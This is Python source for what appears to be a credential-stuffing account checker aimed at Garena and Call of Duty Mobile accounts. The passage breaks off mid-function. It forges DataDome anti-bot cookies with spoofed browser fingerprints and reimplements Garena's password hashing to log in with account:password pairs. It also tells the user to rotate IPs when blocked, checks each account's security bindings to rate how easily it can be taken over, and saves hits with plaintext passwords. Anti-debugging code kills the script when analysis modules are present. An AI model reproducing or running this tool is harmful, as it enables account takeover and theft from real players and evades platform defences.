import hashlib
import requests
import time
import json
import os
import urllib.parse
from Crypto.Cipher import AES
import logging
import random
import cloudscraper
import colorama
import threading
import sys

def _runtime_protect():
    # Anti-debugging and analysis module detection
    try:
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            print("Debugging detected - terminating")
            sys.exit(1)
        for mod in ("pdb", "trace", "bdb", "dis"):
            if mod in sys.modules:
                print("Analysis module detected - terminating")
                sys.exit(1)
    except Exception:
        pass

def _check_integrity():
    # Minimal integrity check placeholder to satisfy server import path
    try:
        _runtime_protect()
        return True
    except Exception:
        return False

colorama.init(autoreset=True)

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
            else:
                self.invalid_count += 1
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                if valid:
                    self.no_codm_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        bright_blue = '\033[94m'
        reset_color = '\033[0m'
        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @poqruette{reset_color}"

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
    
    def get_valid_cookie(self):
        return None
    
    def save_cookie(self, cookie):
        return True

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            logger.info(f"[𝙄𝙉𝙁𝙊] 𝘿𝘼𝙏𝘼𝘿𝙊𝙈𝙀 𝘾𝙊𝙊𝙆𝙄𝙀 𝙐𝙋𝘿𝘼𝙏𝙀𝘿!: {datadome_cookie[:30]}...")
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Script PAUSED. Fix your network and press Enter to continue...")
            
            input()
            
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-fetching new DataDome cookie...")
            new_datadome = get_datadome_cookie(session)
            if new_datadome:
                self.set_datadome(new_datadome)
                self._403_attempts = 0
                logger.info(f"[SUCCESS] Auto-fetched new DataDome: {new_datadome[:30]}...")
                return True
            else:
                logger.error(f"[ERROR] Failed to auto-fetch DataDome cookie")
                return False
        return False

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    
    for attempt in range(retries):
        try:
            response = session.post(url, headers=headers, data=data, timeout=30)
            response.raise_for_status()
            
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from DataDome")
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                    
                logger.info(f"[SUCCESS] 𝘿𝘿 𝘾𝙊𝙊𝙆𝙄𝙀 𝙁𝙊𝙐𝙉𝘿!!: {datadome[:30]}...")
                return datadome
            else:
                logger.warning(f"[WARNING] DataDome cookie not found. Status: {response_json.get('status')}")
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                    
        except requests.exceptions.RequestException as e:
            logger.error(f"[ERROR] Error getting DataDome cookie (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(0.5)
        except Exception as e:
            logger.error(f"[ERROR] Unexpected error getting DataDome cookie: {e}")
            if attempt < retries - 1:
                time.sleep(0.5)
    
    return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1} for {account} with cookies: {bool(cookie_header)}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            logger.warning(f"[WARNING] Error parsing cookie from set-cookie: {e}")
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                logger.warning(f"[WARNING] Error extracting cookies from response: {e}")
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
                        logger.info(f"[COOKIE] Updated DataDome: {cookie_value[:30]}...")
                    elif cookie_name == 'apple_state_key':
                        logger.info(f"[COOKIE] Updated apple_state_key: {cookie_value[:30]}...")
                    elif cookie_name == 'sso_key':
                        logger.info(f"[COOKIE] Updated sso_key: {cookie_value[:30]}...")
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(0.5)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            final_cookies = session.cookies.get_dict()
            logger.debug(f"[DEBUG] Final cookies after prelogin: {list(final_cookies.keys())}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    logger.warning(f"[WARNING] Error extracting cookie from 403 error: {ex}")
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(0.5)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                        
                    if attempt < retries - 1:
                        time.sleep(0.5)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
                
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(0.5)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            logger.warning(f"[WARNING] Error parsing cookie from login response: {e}")
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                logger.warning(f"[WARNING] Error extracting cookies from login response: {e}")
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'sso_key':
                        logger.info(f"[COOKIE] Login set sso_key: {cookie_value[:30]}...")
                    elif cookie_name == 'apple_state_key':
                        logger.info(f"[COOKIE] Login updated apple_state_key: {cookie_value[:30]}...")
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'error_auth':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            logger.info(f"[SUCCESS] Logged in: {account}")
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(0.5)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"[WARNING] No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"[INFO] No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"[WARNING] CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"[SUCCESS] CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"[ERROR] Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_codm_info(account, codm_info):
    if not codm_info:
        return ""
    
    display_text = f" | CODM: {codm_info.get('codm_nickname', 'N/A')} (Level {codm_info.get('codm_level', 'N/A')})"
    
    region = codm_info.get('region', '')
    if region and region != 'N/A':
        display_text += f" [{region.upper()}]"
    
    return display_text

def save_codm_accounts(account, password, codm_info, is_clean):
    try:
        if not codm_info:
            return
            
        codm_nickname = codm_info.get('codm_nickname', 'N/A')
        codm_level = codm_info.get('codm_level', 'N/A')
        codm_uid = codm_info.get('uid', 'N/A')
        shells = "unknown"

        notclean_format = f"Account: {account}:{password} | Binds: {'connected' if not is_clean else 'bounds'} | CODM Nickname: {codm_nickname} | CODM Level: {codm_level} | CODM UID: {codm_uid} | Shells: {shells}"
        clean_format = f"Account: {account}:{password} | CODM Nickname: {codm_nickname} | CODM Level: {codm_level} | CODM UID: {codm_uid} | Shells: {shells}"

        if not is_clean:
            with open('notclean_codm.txt', 'a', encoding='utf-8') as f:
                f.write(notclean_format + '\n')
        else:
            with open('clean_codm.txt', 'a', encoding='utf-8') as f:
                f.write(clean_format + '\n')
                
    except Exception as e:
        logger.error(f"[ERROR] Error saving CODM accounts: {e}")

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
        account_info['binds'].append('Email')
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")
    
    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
    try:
        logger.info(f"[COOKIE] Initializing cookies for {account}")
        
        current_cookies = session.cookies.get_dict()
        logger.debug(f"[DEBUG] Initial cookies: {list(current_cookies.keys())}")
        
        datadome_manager.clear_session_datadome(session)
        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if success:
                logger.info(f"[COOKIE] Using existing DataDome: {current_datadome[:30]}...")
            else:
                logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                logger.warning(f"[WARNING] DataDome generation failed, proceeding without it")
            else:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
